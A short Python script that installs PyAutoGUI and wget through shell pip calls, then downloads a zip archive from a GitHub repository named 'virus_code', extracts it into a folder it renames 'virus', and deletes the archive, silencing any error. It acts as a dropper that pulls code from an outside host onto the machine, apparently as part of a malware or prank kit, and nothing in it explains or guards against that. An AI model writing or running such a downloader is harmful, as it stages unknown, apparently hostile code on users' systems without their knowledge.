from os import system
system('pip install PyAutoGUI')
system('pip install wget')
import zipfile
from wget import download
from os import remove,rename
from time import sleep

try:
	download('https://github.com/Stepani2YT/virus_code/archive/refs/heads/main.zip','virus.zip')
	file_zip = zipfile.ZipFile('virus.zip', 'r')

	file_zip.extractall('./')
	rename('virus_code-main', 'virus')
	file_zip.close()
	sleep(1)
	remove('virus.zip')
except:
	print("Error!!!")